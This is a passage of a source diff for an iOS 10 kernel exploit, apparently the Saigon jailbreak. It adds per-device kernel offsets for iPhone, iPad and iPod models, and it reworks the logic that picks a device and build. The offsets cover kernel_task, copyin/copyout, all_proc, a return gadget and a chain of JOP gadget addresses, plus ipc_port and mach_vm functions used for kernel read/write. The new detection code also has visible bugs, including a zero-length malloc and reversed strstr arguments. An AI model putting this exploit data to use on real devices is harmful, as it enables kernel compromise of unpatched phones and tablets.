+    g_offsets.copyin = 0xFFFFFFF00718F76C - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xfffffff00718f974 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // same
+    
+}
+
+// iPad Air 2 (J81AP) - iOS 10.2.1 (14D27)
+void set_j81ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF006070000; // updated
+    g_offsets.kernel_task = 0xFFFFFFF0075C2050 - g_offsets.kernel_base; // updated
+    g_offsets.realhost = 0xFFFFFFF007548A98 - g_offsets.kernel_base; // updated !!!
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // updated
+    g_offsets.osserializer_serialize = 0xfffffff00745b324 - g_offsets.kernel_base; // updated
+    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // updated
+    g_offsets.cachesize_callback = 0xfffffff0073be4cc - g_offsets.kernel_base; // updated
+    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // updated
+    g_offsets.copyin = 0xfffffff00718f864 - g_offsets.kernel_base; // updated
+    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base; // updated
+    g_offsets.copyout = 0xfffffff00718fa6c - g_offsets.kernel_base; // updated
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // updated
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // updated
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // updated
+}
+
+// iPad Air 2 (J82AP) - iOS 10.2.1 (14D27)
+void set_j82ap_10_2_1() {
+    g_offsets.kernel_base = 0xFFFFFFF006070000; // updated
+    g_offsets.kernel_task = 0xFFFFFFF0075C2050 - g_offsets.kernel_base; // updated
+    g_offsets.realhost = 0xFFFFFFF007548A98 - g_offsets.kernel_base; // updated
+
+    g_offsets.l1icachesize_string = 0xfffffff007057883 - g_offsets.kernel_base; // updated
+    g_offsets.osserializer_serialize = 0xfffffff00745b324 - g_offsets.kernel_base; // updated
+    g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base; // updated
+    g_offsets.cachesize_callback = 0xfffffff0073be4cc - g_offsets.kernel_base; // updated
+    g_offsets.sysctl_hw_family = 0xfffffff00753a678 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xfffffff006ed8748 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00753a628 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_string = 0xfffffff007057890 - g_offsets.kernel_base; // updated
+    g_offsets.copyin = 0xfffffff00718f864 - g_offsets.kernel_base; // updated
+    g_offsets.all_proc = 0xfffffff0075bc528 - g_offsets.kernel_base; // updated
+    g_offsets.copyout = 0xfffffff00718fa6c - g_offsets.kernel_base; // updated
+    g_offsets.panic = 0xfffffff0070b6dd0 - g_offsets.kernel_base; // updated
+    g_offsets.quad_format_string = 0xfffffff007069601 - g_offsets.kernel_base; // updated
+    g_offsets.null_terminator = 0xfffffff00706a407 - g_offsets.kernel_base; // updated
+}
+
+
+// iPhone 6 (N61AP) - iOS 10.3.1 (14E304)
+void set_n61ap_10_3_1() {
+    
+    g_offsets.kernel_base = 0xFFFFFFF00609C000; // updated
+    g_offsets.kernel_task = 0xfffffff0075b4048 - g_offsets.kernel_base;
+    g_offsets.realhost = 0xfffffff00753ABA0 - g_offsets.kernel_base;
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // same
+    g_offsets.l1icachesize_string = 0xfffffff007057a83 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00744d6ac - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xfffffff0075b40c8 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xFFFFFFF0073B3B04 - g_offsets.kernel_base; // updated
+    g_offsets.sysctl_hw_family = 0xfffffff00752a320 - g_offsets.kernel_base; // same
+    g_offsets.ret_gadget = 0xFFFFFFF0070B5428 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xFFFFFFF006EED520 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_handler = 0xfffffff00752a280 - g_offsets.kernel_base; // THIS IS ACTUALLY l1icachesize handler???!?!?
+    g_offsets.l1dcachesize_string = 0xfffffff007057a90 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xfffffff00718d3a8 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff0075ae6e0 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xfffffff00718d59c - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xfffffff0070b69b8 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff007069de1 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00706a40f - g_offsets.kernel_base; // same
+    
+
+    // JOP staff
+    g_offsets.jop_GADGET_PROLOGUE_2                = 0xfffffff006719200 - g_offsets.kernel_base;
+    g_offsets.jop_LDP_X2_X1_X1__BR_X2              = 0xfffffff006b5d8cc - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X23_X0__BLR_X8               = 0xfffffff006426efc - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_INITIALIZE_X20_1          = 0xfffffff00662bd28 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X25_X19__BLR_X8              = 0xfffffff006a086ac - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_POPULATE_2                = 0xfffffff006d3ef20 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X19_X5__BLR_X8               = 0xfffffff0074a98c4 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X20_X19__BR_X8               = 0xfffffff0068345ac - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X5_X6__BLR_X8                = 0xfffffff0066392a8 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X21_X11__BLR_X8              = 0xfffffff00749e324 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X22_X9__BLR_X8               = 0xfffffff0064399bc - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X0_X3__BLR_X8                = 0xfffffff00721e278 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X24_X4__BR_X8                = 0xfffffff0069dc86c - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X8_X10__BR_X12               = 0xfffffff006960b94 - g_offsets.kernel_base;
+    g_offsets.jop_MOV_X19_X9__BR_X8                = 0xfffffff0069439d4 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_CALL_FUNCTION_1           = 0xfffffff007495520 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_STORE_RESULT_1            = 0xfffffff00683e910 - g_offsets.kernel_base;
+    g_offsets.jop_GADGET_EPILOGUE_2                = 0xfffffff0070a9ebc - g_offsets.kernel_base;
+
+
+    // 10.3.x offsets
+    g_offsets.kernel_map = 0xFFFFFFF0075B4050 - g_offsets.kernel_base; // added
+    g_offsets.zone_map = 0xFFFFFFF007558478 - g_offsets.kernel_base;
+    g_offsets.mach_vm_remap = 0xFFFFFFF007164620 - g_offsets.kernel_base; // added
+    g_offsets.ipc_port_make_send = 0xFFFFFFF0070A5C40 - g_offsets.kernel_base; // added
+    g_offsets.ipc_port_alloc_special = 0xFFFFFFF0070A611C - g_offsets.kernel_base; // added
+    g_offsets.ipc_space_kernel = 0xFFFFFFF007539408 - g_offsets.kernel_base; // added
+    g_offsets.ipc_kobject_set = 0xFFFFFFF0070B9374 - g_offsets.kernel_base; // added
+    g_offsets.mach_vm_wire = 0xFFFFFFF007165078 - g_offsets.kernel_base; // added
+    
+    g_offsets.iosurface_kernel_object_size = 0x350;
+}
+
+
+// iPhone 6s (N71AP) - iOS 10.3.1 (14E304)
+void set_n71ap_10_3_1() {
+    g_offsets.kernel_base = 0xfffffff00601c000; // same
+    g_offsets.kernel_task = 0xFFFFFFF0075A4048 - g_offsets.kernel_base; // added
+    g_offsets.realhost = 0xFFFFFFF00752ABA0 - g_offsets.kernel_base; // added
+    g_offsets.kernel_text = 0xFFFFFFF007004000; // added
+    g_offsets.l1icachesize_string = 0xfffffff00704ba85 - g_offsets.kernel_base; // same
+    g_offsets.osserializer_serialize = 0xfffffff00744053c - g_offsets.kernel_base; // same
+    g_offsets.kern_proc = 0xfffffff0075a40c8 - g_offsets.kernel_base; // same
+    g_offsets.cachesize_callback = 0xFFFFFFF0073A6994 - g_offsets.kernel_base; // updated
+    g_offsets.sysctl_hw_family = 0xFFFFFFF00751A280 - g_offsets.kernel_base; // updated
+    g_offsets.ret_gadget = 0xFFFFFFF0070A9208 - g_offsets.kernel_base; // updated
+    g_offsets.iofence_vtable_offset = 0xfffffff006e7bd60 - g_offsets.kernel_base; // same
+    g_offsets.l1dcachesize_handler = 0xFFFFFFF00751A2D0 - g_offsets.kernel_base; // updated
+    g_offsets.l1dcachesize_string = 0xfffffff00704ba92 - g_offsets.kernel_base; // same
+    g_offsets.copyin = 0xfffffff007180720 - g_offsets.kernel_base; // same
+    g_offsets.all_proc = 0xfffffff00759e6c0 - g_offsets.kernel_base; // same
+    g_offsets.copyout = 0xfffffff007180914 - g_offsets.kernel_base; // same
+    g_offsets.panic = 0xfffffff0070aa798 - g_offsets.kernel_base; // same
+    g_offsets.quad_format_string = 0xfffffff00705dde3 - g_offsets.kernel_base; // same
+    g_offsets.null_terminator = 0xfffffff00705e411 - g_offsets.kernel_base; // same
+    
+    // 10.3.x offsets
+    g_offsets.kernel_map = 0xFFFFFFF0075A4050 - g_offsets.kernel_base; // added
 }
 
 /*
@@ -580,13 +920,13 @@ cleanup:
 /*
  * Function name: 	offsets_determine_initializer_for_device_and_build
  * Description:		Determines which function should be used as an initializer for the device and build given.
- * Returns:			kern_return_t and func pointer as an output param.
+ * Returns:			kern_return_t.
  */
 
 static
-kern_return_t offsets_determine_initializer_for_device_and_build(char * device, char * build, init_func * func) {
+kern_return_t offsets_determine_initializer_for_device_and_build(char * device, char * build) {
     
-    kern_return_t ret = KERN_INVALID_HOST;
+    kern_return_t ret = KERN_SUCCESS;
     
     struct utsname u = { 0 };
     uname(&u);
@@ -596,111 +936,166 @@ kern_return_t offsets_determine_initializer_for_device_and_build(char * device, 
     printf("[INFO]: release: %s\n", u.release);
     printf("[INFO]: kernel version: %s\n", u.version);
     printf("[INFO]: machine: %s\n", u.machine);
-    
+    printf("[INFO]: build: %s\n", build);
+
     init_default();
     
-    if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_T8010") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T8010\n");
-        *func = (init_func)init_RELEASE_ARM64_T8010_1630_37894221;
-        ret = KERN_SUCCESS;
+    size_t len = 0;
+    char *model = malloc(len * sizeof(char));
+    sysctlbyname("hw.model", NULL, &len, NULL, 0);
+    if (len) {
+        sysctlbyname("hw.model", model, &len, NULL, 0);
+        printf("[INFO]: model internal name: %s\n", model);
     }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_S5L8960X") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_S5L8960X\n");
-        *func = (init_func)init_RELEASE_ARM64_S5L8960X_1650_37895227;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:55 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_T8010") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T8010\n");
-        *func = (init_func)init_RELEASE_ARM64_T8010_1650_37895227;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:55 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_T7001") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T7001\n");
-        *func = (init_func)init_RELEASE_ARM64_T7001_1650_37895227;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:09 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_T7001") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T7001\n");
-        *func = (init_func)init_RELEASE_ARM64_T7001_1630_37893214;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:09 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_S8000") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_S8000\n");
-        *func = (init_func)init_RELEASE_ARM64_S8000_1630_37893214;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_T7000") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T7000\n");
-        *func = (init_func)init_RELEASE_ARM64_T7000_1630_37894221;
-        ret = KERN_SUCCESS;
-    }
-    // iPad Air
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:09 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_S5L8960X") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_S5L8960X\n");
-        *func = (init_func)init_RELEASE_ARM64_S5L8960X_1630_37893214;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_T7000") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T7000\n");
-        *func = (init_func)init_RELEASE_ARM64_T7000_1650_37895227;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.5.0: Thu Feb 23 23:22:54 PST 2017; root:xnu-3789.52.2~7/RELEASE_ARM64_S8000") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_S8000\n");
-        *func = (init_func)init_RELEASE_ARM64_S8000_1650_37895227;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_T7001") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T7001\n");
-        *func = (init_func)init_RELEASE_ARM64_T7001_1630_37894221;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:46 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_S5L8960X") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_S5L8960X\n");
-        *func = (init_func)init_RELEASE_ARM64_S5L8960X_1630_37894221;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:08 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_T8010") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T8010\n");
-        *func = (init_func)init_RELEASE_ARM64_T8010_1630_37893214;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Tue Nov 29 21:40:08 PST 2016; root:xnu-3789.32.1~4/RELEASE_ARM64_T7000") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_T7000\n");
-        *func = (init_func)init_RELEASE_ARM64_T7000_1630_37893214;
-        ret = KERN_SUCCESS;
-    }
-    else if (strcmp(u.version, "Darwin Kernel Version 16.3.0: Thu Dec 15 22:41:45 PST 2016; root:xnu-3789.42.2~1/RELEASE_ARM64_S8000") == 0) {
-        printf("[INFO]: Detected RELEASE_ARM64_S8000\n");
-        *func = (init_func)init_RELEASE_ARM64_S8000_1630_37894221;
-        ret = KERN_SUCCESS;
-    }
-    else {
-        printf("[ERROR]:Unsupported device. quitting.\n");
-        goto cleanup;
+
+    // detect offsets
+    if(strstr("14C92", build)) {
         
+        if(strstr("J72AP", model)) { // iPad Air 1 - J72AP
+            
+            printf("[INFO]: iPad Air 1 (J72AP) running iOS 10.2\n");
+            set_j71ap_10_2();
+            
+        } else {
+            printf("[ERROR]: iOS version supported but device is not\n");
+            ret = KERN_FAILURE;
+        }
+        
+    } else if(strstr("14D27", build)) {
+
+        if(strstr("N102AP", model)) { // iPod Touch 6 - N102AP
+            
+            printf("[INFO]: iPod Touch 6 (N102AP) running iOS 10.2.1\n");
+            set_n102ap_10_2_1();
+            
+        } else if(strstr("N69AP", model)) { // iPhone SE - N69AP
+            
+            printf("[INFO]: iPhone SE (N69AP) running iOS 10.2.1\n");
+            set_n69ap_10_2_1();
+        
+        } else if(strstr("N69uAP", model)) { // iPhone SE - N69uAP
+            
+            printf("[INFO]: iPhone SE (N69uAP) running iOS 10.2.1 (Not tested)\n");
+            set_n69uap_10_2_1();
+            
+            
+        } else if(strstr("N61AP", model)) { // iPhone 6 - N61AP
+            
+            printf("[INFO]: iPhone 6 running iOS 10.2.1\n");
+            set_n61ap_10_2_1();
+            
+            
+        } else if(strstr("N56AP", model)) { // iPhone 6 Plus - N56AP
+            
+            printf("[INFO]: iPhone 6 Plus running iOS 10.2.1\n");
+            set_n56ap_10_2_1();
+            
+            
+        } else if(strstr("N71AP", model)) { // iPhone 6s - N71AP
+            
+            printf("[INFO]: iPhone 6s (N71AP) running iOS 10.2.1\n");
+            set_n71ap_10_2_1();
+            
+            
+        } else if(strstr("N71mAP", model)) {  // iPhone 6s - N71mAP
+           
+            printf("[INFO]: iPhone 6s (N71mAP) running iOS 10.2.1\n");
+            set_n71map_10_2_1();
+            
+            
+        } else if(strstr("N66AP", model)) {  // iPhone 6s Plus - N66AP
+            
+            printf("[INFO]: iPhone 6s Plus (N66AP) running iOS 10.2.1\n");
+            set_n66ap_10_2_1();
+            
+            
+        } else if(strstr("N66mAP", model)) {  // iPhone 6s Plus - N66mAP
+            
+            printf("[INFO]: iPhone 6s Plus (N66mAP) running iOS 10.2.1\n");
+            set_n66map_10_2_1();
+            
+            
+        } else if(strstr("D101AP", model)) {  // iPhone 7 - D101AP
+            
+            printf("[INFO]: iPhone 7 (D101AP) running iOS 10.2.1\n");
+//            set_d101ap_10_2_1();
+            
+            
+        } else if(strstr("J96AP", model)) {  // iPad Mini 4 - J96AP
+            
+            printf("[INFO]: iPad Mini 4 (J96AP) running iOS 10.2.1\n");
+            set_j96ap_10_2_1();
+            
+            
+        } else if(strstr("J97AP", model)) {  // iPad Mini 4 - J97AP
+            
+            printf("[INFO]: iPad Mini 4 (J97AP) running iOS 10.2.1\n");
+            set_j97ap_10_2_1();
+            
+            
+        } else if(strstr("J81AP", model)) {  // iPad Air 2 - J81AP
+            
+            printf("[INFO]: iPad Air 2 (J81AP) running iOS 10.2.1\n");
+            set_j81ap_10_2_1();
+            
+            
+        } else if(strstr("J82AP", model)) {  // iPad Air 2 - J82AP
+            
+            printf("[INFO]: iPad Air 2 (J82AP) running iOS 10.2.1\n");
+            set_j82ap_10_2_1();
+            
+            
+        } else {
+            
+            printf("[ERROR]: iOS version supported but device is not\n");
+            ret = KERN_FAILURE;
+        }
+
+
+    } else if(strstr("14E304", build)) {
+        
+        if(strstr("N61AP", model)) { // iPhone 6 - N61AP
+            
+            NSLog(@"[SAIGON]: iPhone 6 running iOS 10.3.1 -- not tested!\n");
+            set_n61ap_10_3_1();
+
+            
+        } else if(strstr("N71AP", model)) { // iPhone 6s - N71AP
+            
+            printf("[INFO]: iPhone 6s (N71AP) running iOS 10.3.1 -- Not Tested\n");
+//            set_n71ap_10_3_1();
+            ret = KERN_FAILURE;
+            
+        }
+        
+        
+    } else {
+        
+        printf("[ERROR]: iOS version not supported\n");
+        ret = KERN_FAILURE;
     }
+    
     
 cleanup:
     return ret;
 }
 
 
-
 /*
- * Function name: 	offsets_get_init_func
- * Description:		Determines which initialization function should be used for the current build.
- * Returns:			kern_return_t and function pointer in output params.
+ * Function name: 	offsets_init
+ * Description:		Initializes offsets for the current build running.
+ * Returns:			kern_return_t.
  */
 
-static
-kern_return_t offsets_get_init_func(init_func * func) {
-    
+kern_return_t offsets_init() {
+
     kern_return_t ret = KERN_SUCCESS;
     
     char machine[0x100] = {0};
     char build[0x100] = {0};
     
+    memset(&g_offsets, 0, sizeof(g_offsets));
+
     ret = offsets_get_device_type_and_version(machine, build);
     if (KERN_SUCCESS != ret)
     {
@@ -716,37 +1111,10 @@ kern_return_t offsets_get_init_func(init_func * func) {
     NSString *version = [[UIDevice currentDevice] systemVersion];
     printf("[INFO]: version: %s\n", [version UTF8String]);
     
-    ret = offsets_determine_initializer_for_device_and_build(machine, build, func);
+    ret = offsets_determine_initializer_for_device_and_build(machine, build);
     if (KERN_SUCCESS != ret)
-    {
-        printf("[ERROR]: finding the appropriate function loader for the specific host\n");
         goto cleanup;
-    }
-    
-    
+
 cleanup:
     return ret;
-}
-
-
-/*
- * Function name: 	offsets_init
- * Description:		Initializes offsets for the current build running.
- * Returns:			int - zero for success, otherwise non-zero.
- */
-
-int offsets_init() {
-    
-    init_func func = NULL;
-    
-    memset(&g_offsets, 0, sizeof(g_offsets));
-    
-    if (offsets_get_init_func(&func) != KERN_SUCCESS) {
-
-        printf("[ERROR]: initializing offsets. No exploit for you!\n");
-        return 1; // Fail
-    }
-    
-    func();
-    return 0;
 }
